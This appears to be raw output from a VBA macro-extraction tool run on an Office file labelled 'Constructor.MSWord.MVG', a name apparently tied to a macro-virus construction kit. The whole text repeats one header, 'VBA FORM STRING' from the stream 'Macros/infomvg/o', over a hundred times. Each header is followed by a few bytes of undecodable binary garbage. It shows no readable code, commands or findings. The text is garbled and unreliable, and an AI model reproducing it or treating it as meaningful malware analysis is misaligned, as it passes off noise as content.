- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� ̹
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Xx��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{<�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�p!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	i���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�wÁ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�7%0�!�%{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�!��	|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
30(ؖ(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<j�/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�R5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��Y%��h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ip/�� |�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~0�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mP1%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Tl�j&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�
��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�B] Zo�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��IM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"Rb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~ +'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$IB$>B)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5m�c(8�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ũ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=zB��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^t�EK�FU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�6�	|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F'a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bP%`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F"&bh�Z���#;Gg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F䦋
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HLk���!��c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e"�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� lҁ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���-
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C){V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�'��ZGmd��FE��Ĺd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�@G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʹ�`��
�`��rl3��ꀐ*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gg�#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wc�s/G��d���!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�$'��Fr�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#Y��c@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŀ��S2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p"I��8<ĳ`h�0�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~t�w�s�;x���kG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uG�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@��D�#A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	\���fYv���et�Q�v�ss�u~}�w���x�Ǵ�$�P+z���%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��ȉ�<��PR+z�wE�)�.lw��z�x��x��ʬ�ʮ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˲<˴\˶|˖,��,��<�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ޛRD)�"��c<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l̠��jɋ/X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�l��$I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{ʆ@'1m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q`�3m�!%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P� 7� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0g�X~
�ExTI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p���p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�	d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`Ҽ`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�p
� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ِ:�����E 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��D���B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"p-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
гI���q7H�Awe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�
) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&jR'� ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q]�mo)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ᘎ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� Piw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H!"�ľm`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`f�p/�0��`��
��
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0UZ`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U��s����$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E`ފ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�[O|l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���с�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ߗV��,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	��
*r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k��q= �	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l@
Z@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jwW�8WPȇJ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`6���-~6U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

���n��ʰө�ӱ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0
�P	v 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b 	��p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<�h	μ� ɥ\puB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QD��ؗñ.�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����	g�^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�_�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U 1���A�|w�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&>`>�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t��@�B�'�>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1���l�"�{������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ͺ`Kg"��X|H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ͺ=�,*\�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=ܖoS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^��!bZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�ހ'�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h0Dh��p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Հ
�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UM��C`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,��$�8�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��౺
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fPi�gQ߰�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�&C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�GF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Vb�-Y�#C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�j0�w9W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W-d8�%C�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'ΐ$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%3��p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
